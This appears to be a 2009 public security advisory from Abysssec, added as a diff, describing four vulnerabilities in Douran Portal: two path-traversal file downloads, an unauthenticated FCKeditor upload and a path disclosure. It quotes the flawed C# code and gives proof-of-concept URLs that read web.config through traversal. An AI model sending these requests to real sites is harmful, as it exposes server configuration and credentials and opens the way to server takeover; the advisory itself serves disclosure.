@@ -1,0 +1,102 @@
+Abysssec Inc Public Advisory
+
+Description : 
+
+these vulnerabilites found one year ago and new version of this portal "is not" affect whith these vulnerabilites anymore 
+but still lots of web site uses of old version and are vulnerable and also new version is not "fully secure" . so because of patching there 
+is no point to keep these private anymore these vulnerabities are just for educational purpose and author will be not be responsible 
+for any damage using this vulnerabiltes .
+
+Discovery : www.Abysssec.com 
+
+Title  : Douran Portal Multiple Remote Vulnerabilities
+Affected Version : DOURAN Portal   <= V3.9.0.23
+Vendor  Site   : www.douran.com
+
+
+
+Vulnerabilites : 
+
+
+1- File Download Vulnerbility in /Admin/ImportExport/download.aspx
+
+Vulnerable Code :
+
+
+		string strFileName = Request.Params["Filename"];
+		if((strFileName != null) && (strFileName != ""))
+		{
+			string strPath = Server.MapPath("../../_DouranPortal/ExportPortal");
+			strPath += "\\" + strFileName; // Vulnerablity
+			if(System.IO.File.Exists(strPath))
+			{
+				Response.Clear();
+				Response.ContentType = "application/octet-stream";
+				Response.AddHeader("Content-Transfer-Encoding", "binary");
+				Response.AddHeader("Content-Disposition", "attachment; filename=\"" + strFileName + "\"");
+				Response.Flush();
+				Response.WriteFile(strPath);
+				Response.End();
+
+			.....
+
+
+PoC : http://www.vulnerable.com/Admin/ImportExport/Download.aspx?filename=../../web.config
+
+
+
+2- File Download Vulnerbility in /download.aspx
+
+Vulnerable Code :
+
+
+	string fileNameAttach = Request.Params["FileNameAttach"];
+	string filePathAttach = Request.Params["FilePathAttach"];
+	string originalAttachFileName = Request.Params["OriginalAttachFileName"];
+	if((fileNameAttach != null) && (filePathAttach != ""))
+	{
+		string strPath = Server.MapPath(filePathAttach + "/" + fileNameAttach); // Vulnerable
+		if(System.IO.File.Exists(strPath))
+		{
+			System.IO.Stream iStream = null;
+
+			// Buffer to read 1 mega bytes in chunk:
+			int segmentLegthToRead = 1024 * 1024;
+			byte[] buffer = new Byte[segmentLegthToRead];
+		......
+
+PoC : http://www.vulnerable.com/download.aspx?FileNameAttach=/web.config
+
+3- File Upload Vulnerability DesktopModules/fck/editor
+
+Vulnerablity : 
+
+Using Fckeditor without any authentication will give ability to attacker to
+upload his / her own file and fckeditor won't check file extention
+it will give ability to attacker upload a malicius server side ASP / ASPX / PHP  / JSP .
+so this vulnerability can creation access to server / portal completely .
+
+PoC : http://www.vulnerable.com/DesktopModules/fck/editor/filemanager/upload/test.html
+
+
+4-Path Disclosure Vulnerablity In DesktopModules/DesktopCalendar/HZAN_pickercal.aspx
+
+Vulnerable Code : 
+
+Calendar1.FullWidth = true;
+	Calendar1.BigCaledar = bool.Parse((string)Request.QueryString["calsize"]);
+	if (!IsPostBack) 
+	{
+		Calendar1.Date = new DateTime(long.Parse((string)Request.QueryString["curd"]));
+		Calendar1.CalendarCulture = (HZAN.Calendar.CultureType)Enum.Parse(typeof(HZAN.Calendar.CultureType),(string)Request.QueryString["culture"]);
+		seldate = Calendar1.Date.ToShortDateString();
+		ChangeSelDate1();
+	}
+
+
+PoC : http://www.vulnerable.com/DesktopModules/DesktopCalendar/HZAN_pickercal.aspx?calsize='
+
+
+Final Note : for advanced security topics / sharing idea and etc ... please feel free to contact me at  : admin [at] abysssec.com
+
+# milw0rm.com [2009-05-18]
